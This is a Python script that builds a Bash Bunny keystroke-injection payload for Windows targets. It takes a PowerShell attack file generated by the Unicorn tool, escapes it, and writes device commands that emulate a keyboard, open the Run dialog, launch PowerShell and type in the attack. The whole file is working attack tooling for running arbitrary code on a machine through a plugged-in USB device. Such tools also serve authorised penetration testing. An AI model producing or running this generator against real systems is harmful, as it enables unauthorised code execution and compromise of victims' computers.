# Copyright Tudor Gheorghiu - Prodicode Solutions S.R.L.

import argparse
import os

parser = argparse.ArgumentParser(description="A simple python software to generate a bash bunny payload using the powershell_attack.txt generated by unicorn by trustedsec")
parser.add_argument("powershell", help="The powershell_attack.txt file generated by unicorn",
                    type=str)
args = parser.parse_args()

f = open(args.powershell, "r")
attack = f.read()
for ch in ['\"', '\'', '(', ')', '+', '/', ';', ':']:
    if ch in attack:
        attack=attack.replace(ch,"\\"+ch)

print("Finished reading powershell_attack.txt, building payload.txt")

try:
    os.remove("payload.txt")
except OSError:
    pass

with open('payload.txt', 'a+') as the_file:
    the_file.write('# Author: Prodicode\n')
    the_file.write('# Creds: trustedsec\n')
    the_file.write('# Version: 1.1\n')
    the_file.write('# Firmware support: 1.1\n')
    the_file.write('# Target: Windows\n')
    the_file.write('ATTACKMODE HID\n')
    the_file.write('LED ATTACK\n')
    the_file.write('Q GUI r\n')
    the_file.write('Q DELAY 100\n')
    the_file.write('Q STRING powershell\n')
    the_file.write('Q DELAY 250\n')
    the_file.write('Q ENTER\n')
    the_file.write('Q DELAY 500\n')
    the_file.write('Q STRING '+attack+'\n')
    the_file.write('Q ENTER\n')
    the_file.write('LED FINISH\n')

print("Done. Created payload.txt")
